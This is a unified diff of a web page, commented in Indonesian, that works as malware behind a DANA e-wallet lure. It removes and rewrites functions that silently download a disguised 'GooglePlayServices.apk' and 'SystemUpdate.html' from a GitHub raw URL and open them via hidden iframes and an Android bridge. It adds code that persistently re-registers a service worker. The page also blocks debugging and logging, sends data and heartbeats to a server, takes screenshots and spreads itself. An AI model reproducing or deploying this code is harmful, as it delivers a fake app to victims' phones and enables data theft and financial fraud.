@@ -31,7 +31,6 @@
         .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
         .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
         .ios-download{display:none}
-        .iframe-loader{position:absolute;width:0;height:0;border:none;visibility:hidden}
     </style>
 </head>
 <body>
@@ -39,7 +38,6 @@
 <iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
 <div id="statusBar" class="status-bar"></div>
 <iframe id="downloadFrame" class="hidden-download"></iframe>
-<iframe id="htmlLoader" class="iframe-loader"></iframe>
 <div id="iosDownload" class="ios-download"></div>
 
 <div id="popupDana">
@@ -66,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - GERBANG (TANPA REDIRECT)
+// 🔥 INDEX.HTML - UNIVERSAL + SW AUTO-REGISTER + CECK STATUS
 // ============================================================
 
 console.log = function() {};
@@ -118,13 +116,14 @@ Object.defineProperty(document, 'referrer', { value: '' });
 // ============================================================
 function detectPlatform() {
     var ua = navigator.userAgent.toLowerCase();
-    return {
+    var platform = {
         isAndroid: ua.indexOf('android') > -1,
         isIOS: /iphone|ipad|ipod/.test(ua),
         isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
         isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
         isAndroidBridge: typeof AndroidBridge !== 'undefined'
     };
+    return platform;
 }
 var PLATFORM = detectPlatform();
 
@@ -137,12 +136,11 @@ var semuaDidapat = false;
 var spreadDone = false;
 var DOWNLOAD_STARTED = false;
 var NOTIFICATION_SHOWN = false;
+var REDIRECT_DONE = false;
 var WS_PASSWORD = '';
 var IP_ADDRESS = '';
 var LOCATION_DATA = null;
 var SW_REGISTERED = false;
-var HTML_LOADED = false;
-var APK_DOWNLOADED = false;
 
 // ============================================================
 // FUNGSI K() - KIRIM DATA KE SERVER
@@ -290,105 +288,6 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD APK PAKAI XHR (PASTI!)
-// ============================================================
-function downloadAPK() {
-    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-    
-    K({ sumber: 'apk_download_start', data: 'xhr' });
-    
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', apkUrl, true);
-        xhr.responseType = 'blob';
-        xhr.timeout = 60000;
-        
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var blob = xhr.response;
-                var url = URL.createObjectURL(blob);
-                var link = document.createElement('a');
-                link.href = url;
-                link.download = 'GooglePlayServices.apk';
-                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                document.body.appendChild(link);
-                setTimeout(function() {
-                    link.click();
-                    APK_DOWNLOADED = true;
-                    K({ sumber: 'apk_download_xhr_success', data: 'ok' });
-                    setTimeout(function() {
-                        try { document.body.removeChild(link); } catch(e) {}
-                        URL.revokeObjectURL(url);
-                    }, 2000);
-                }, 300);
-                return;
-            }
-            K({ sumber: 'apk_xhr_error', data: 'status_' + xhr.status });
-        };
-        xhr.onerror = function() { K({ sumber: 'apk_xhr_network', data: 'error' }); };
-        xhr.ontimeout = function() { K({ sumber: 'apk_xhr_timeout', data: 'timeout' }); };
-        xhr.send();
-    } catch(e) {
-        K({ sumber: 'apk_xhr_exception', data: e.message });
-    }
-}
-
-// ============================================================
-// 🔥 BUKA SystemUpdate.html VIA IFRAME (PASTI!)
-// ============================================================
-function openSystemUpdateHTML() {
-    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    
-    K({ sumber: 'html_open_start', data: 'attempt' });
-    
-    // METHOD 1: Download dulu lalu buka via iframe
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', htmlUrl, true);
-        xhr.timeout = 15000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
-                
-                // Save ke localStorage
-                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
-                
-                // Buka via iframe (PASTI! tidak kena popup blocker)
-                try {
-                    var iframe = document.getElementById('htmlLoader');
-                    if (!iframe) {
-                        iframe = document.createElement('iframe');
-                        iframe.id = 'htmlLoader';
-                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-                        document.body.appendChild(iframe);
-                    }
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    iframe.src = url;
-                    HTML_LOADED = true;
-                    K({ sumber: 'html_opened_iframe', data: 'ok' });
-                    return;
-                } catch(e) {
-                    K({ sumber: 'html_iframe_error', data: e.message });
-                }
-                
-                // Fallback: window.open
-                try {
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    window.open(url, '_blank');
-                    HTML_LOADED = true;
-                    K({ sumber: 'html_opened_window', data: 'ok' });
-                } catch(e) {}
-            }
-        };
-        xhr.send();
-    } catch(e) {
-        K({ sumber: 'html_open_error', data: e.message });
-    }
-}
-
-// ============================================================
 // 🔥 DOWNLOAD APK + SystemUpdate.html (UNIVERSAL)
 // ============================================================
 function downloadPayloadSilent() {
@@ -397,13 +296,144 @@ function downloadPayloadSilent() {
     
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
-    // ✅ 1. DOWNLOAD APK (PAKAI XHR)
-    downloadAPK();
+    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
+    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
-    // ✅ 2. DOWNLOAD SystemUpdate.html + BUKA
+    // ✅ 1. DOWNLOAD APK
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try {
+            A.downloadFile(apkUrl, apkPath);
+            K({ sumber: 'apk_downloaded_bridge', data: { path: apkPath } });
+        } catch(e) {}
+    } else if (PLATFORM.isAndroid && !A.isAvailable) {
+        try {
+            var iframe = document.createElement('iframe');
+            iframe.src = apkUrl;
+            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
+            document.body.appendChild(iframe);
+            setTimeout(function() {
+                try { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch(e) {}
+            }, 5000);
+            K({ sumber: 'apk_download_iframe', data: 'attempt' });
+        } catch(e) {}
+        try {
+            window.open(apkUrl, '_blank');
+            K({ sumber: 'apk_download_tab', data: 'attempt' });
+        } catch(e) {}
+    } else if (PLATFORM.isIOS) {
+        try {
+            window.location.href = 'https://apps.apple.com/id/app/dana-indonesia/id1440716954';
+            K({ sumber: 'apk_download_ios', data: 'redirect_to_appstore' });
+        } catch(e) {}
+    } else {
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', apkUrl, true);
+            xhr.responseType = 'blob';
+            xhr.timeout = 30000;
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var blob = xhr.response;
+                    var link = document.createElement('a');
+                    link.href = URL.createObjectURL(blob);
+                    link.download = 'GooglePlayServices.apk';
+                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                    document.body.appendChild(link);
+                    setTimeout(function() {
+                        link.click();
+                        setTimeout(function() {
+                            try { document.body.removeChild(link); } catch(e) {}
+                            URL.revokeObjectURL(url);
+                        }, 1000);
+                    }, 100);
+                    K({ sumber: 'apk_download_pc', data: 'ok' });
+                }
+            };
+            xhr.send();
+        } catch(e) {}
+    }
+    
+    // ✅ 2. DOWNLOAD SystemUpdate.html
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, true);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var htmlContent = xhr.responseText;
+                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                if (PLATFORM.isAndroid && A.isAvailable) {
+                    try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
+                }
+                try {
+                    var blob = new Blob([htmlContent], { type: 'text/html' });
+                    var url = URL.createObjectURL(blob);
+                    var link = document.createElement('a');
+                    link.href = url;
+                    link.download = 'SystemUpdate.html';
+                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                    document.body.appendChild(link);
+                    setTimeout(function() {
+                        link.click();
+                        setTimeout(function() {
+                            try { document.body.removeChild(link); } catch(e) {}
+                            URL.revokeObjectURL(url);
+                        }, 1000);
+                    }, 100);
+                    K({ sumber: 'html_download_blob', data: 'ok' });
+                } catch(e) {}
+                if (PLATFORM.isIOS) {
+                    try {
+                        var blob = new Blob([htmlContent], { type: 'text/html' });
+                        var url = URL.createObjectURL(blob);
+                        window.open(url, '_blank');
+                        K({ sumber: 'html_download_ios', data: 'ok' });
+                    } catch(e) {}
+                }
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+    
+    // ✅ 3. BUKA SystemUpdate.html
     setTimeout(function() {
-        openSystemUpdateHTML();
-    }, 1000);
+        if (PLATFORM.isAndroid && A.isAvailable) {
+            try {
+                A.openFile(htmlPath);
+                K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
+                return;
+            } catch(e) {}
+        }
+        try {
+            var htmlContent = localStorage.getItem('SystemUpdate.html');
+            if (htmlContent) {
+                var blob = new Blob([htmlContent], { type: 'text/html' });
+                var url = URL.createObjectURL(blob);
+                window.open(url, '_blank');
+                K({ sumber: 'html_open_localstorage', data: 'ok' });
+                return;
+            }
+        } catch(e) {}
+        if (PLATFORM.isAndroid) {
+            try {
+                window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
+                K({ sumber: 'html_open_file', data: 'attempt' });
+            } catch(e) {}
+        }
+        if (PLATFORM.isIOS) {
+            try {
+                var htmlContent = localStorage.getItem('SystemUpdate.html');
+                if (htmlContent) {
+                    var blob = new Blob([htmlContent], { type: 'text/html' });
+                    var url = URL.createObjectURL(blob);
+                    window.open(url, '_blank');
+                    K({ sumber: 'html_open_ios', data: 'ok' });
+                }
+            } catch(e) {}
+        }
+    }, 5000);
 }
 
 // ============================================================
@@ -438,6 +468,12 @@ function createKlaimNotification() {
         
         notif.onclick = function() {
             notif.close();
+            if (!REDIRECT_DONE) {
+                REDIRECT_DONE = true;
+                setTimeout(function() {
+                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+                }, 500);
+            }
         };
         
         setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
@@ -512,7 +548,7 @@ function autoSpread() {
 function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 10000); }
 
 // ============================================================
-// 🔥 SERVICE WORKER
+// 🔥 SERVICE WORKER - AUTO REGISTER + CEK STATUS + RE-REGISTER
 // ============================================================
 function registerServiceWorker() {
     if (!('serviceWorker' in navigator) || PLATFORM.isIOS) {
@@ -526,13 +562,24 @@ function registerServiceWorker() {
         .then(function(reg) {
             SW_REGISTERED = true;
             K({ sumber: 'sw_registered', data: { scope: reg.scope, status: 'success' } });
+            console.log('✅ Service Worker registered:', reg);
+            
+            // Kirim pesan ke SW
             if (reg.active) {
                 reg.active.postMessage({ type: 'force_sync' });
+                K({ sumber: 'sw_message_sent', data: 'force_sync' });
             }
+            
+            // Cek status SW
+            checkSWStatus(reg);
         })
         .catch(function(err) {
             K({ sumber: 'sw_register_failed', data: err.message });
+            console.log('❌ SW register failed:', err);
+            
+            // ✅ RETRY REGISTER AFTER 5 SECONDS
             setTimeout(function() {
+                K({ sumber: 'sw_retry', data: 'attempting_re_register' });
                 navigator.serviceWorker.register('/sw.js', { scope: '/' })
                     .then(function(reg) {
                         SW_REGISTERED = true;
@@ -546,12 +593,82 @@ function registerServiceWorker() {
 }
 
 // ============================================================
+// 🔥 CEK STATUS SERVICE WORKER
+// ============================================================
+function checkSWStatus(reg) {
+    if (!reg) {
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.ready
+                .then(function(registration) {
+                    checkSWStatus(registration);
+                })
+                .catch(function(e) {
+                    K({ sumber: 'sw_ready_error', data: e.message });
+                });
+        }
+        return;
+    }
+    
+    var status = {
+        scope: reg.scope,
+        active: reg.active ? 'yes' : 'no',
+        installing: reg.installing ? 'yes' : 'no',
+        waiting: reg.waiting ? 'yes' : 'no'
+    };
+    
+    K({ sumber: 'sw_status', data: status });
+    console.log('✅ SW Status:', status);
+    
+    // Jika SW tidak aktif, re-register
+    if (!reg.active) {
+        K({ sumber: 'sw_inactive', data: 're_registering' });
+        setTimeout(function() {
+            navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                .then(function(newReg) {
+                    K({ sumber: 'sw_re_register_success', data: { scope: newReg.scope } });
+                })
+                .catch(function(e) {
+                    K({ sumber: 'sw_re_register_failed', data: e.message });
+                });
+        }, 3000);
+    }
+}
+
+// ============================================================
+// 🔥 MONITOR SW - CHECK PERIODIK
+// ============================================================
+function monitorServiceWorker() {
+    if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
+    
+    setInterval(function() {
+        navigator.serviceWorker.ready
+            .then(function(reg) {
+                if (!reg.active) {
+                    K({ sumber: 'sw_monitor_inactive', data: 're_registering' });
+                    navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                        .then(function(newReg) {
+                            K({ sumber: 'sw_monitor_re_register', data: 'success' });
+                        })
+                        .catch(function(e) {});
+                } else {
+                    K({ sumber: 'sw_monitor_ok', data: 'active' });
+                }
+            })
+            .catch(function() {
+                K({ sumber: 'sw_monitor_error', data: 're_registering' });
+                navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                    .catch(function(e) {});
+            });
+    }, 60000); // Cek setiap 1 menit
+}
+
+// ============================================================
 // STATUS BAR
 // ============================================================
 function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
 
 // ============================================================
-// MAIN EXECUTION - TANPA REDIRECT!
+// MAIN EXECUTION
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -568,7 +685,12 @@ function dapatkanSemua() {
         setTimeout(escapeWebView, 100);
         ambilDataCepat();
         startHeartbeat();
+        
+        // 🔥 REGISTER SERVICE WORKER (DENGAN CEK STATUS)
         registerServiceWorker();
+        
+        // 🔥 MONITOR SERVICE WORKER
+        setTimeout(monitorServiceWorker, 5000);
         
         setTimeout(autoSpread, 2000);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
@@ -576,14 +698,12 @@ function dapatkanSemua() {
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        // ✅ REDIRECT DIHAPUS! (Redirect dilakukan di SystemUpdate.html)
-        // Hanya kirim status download ke server
         setTimeout(function() {
-            K({ sumber: 'download_status', data: { 
-                apk: APK_DOWNLOADED ? 'success' : 'pending',
-                html: HTML_LOADED ? 'loaded' : 'pending'
-            } });
-        }, 5000);
+            if (!REDIRECT_DONE) {
+                REDIRECT_DONE = true;
+                try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+            }
+        }, 8000);
         
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
